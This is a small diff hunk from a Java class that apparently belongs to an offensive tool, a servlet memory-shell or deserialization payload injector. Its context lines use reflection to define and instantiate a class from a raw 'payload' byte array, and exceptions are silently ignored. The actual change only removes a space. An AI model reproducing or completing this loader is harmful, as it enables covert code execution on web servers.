@@ -51,6 +51,6 @@ public class Init extends AbstractTranslet implements ServletRequestListener  {
                 Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), payload, 0, payload.length);
                 clazz.newInstance();
             }
-        }catch (Exception ignored){ }
+        }catch (Exception ignored){}
     }
 }
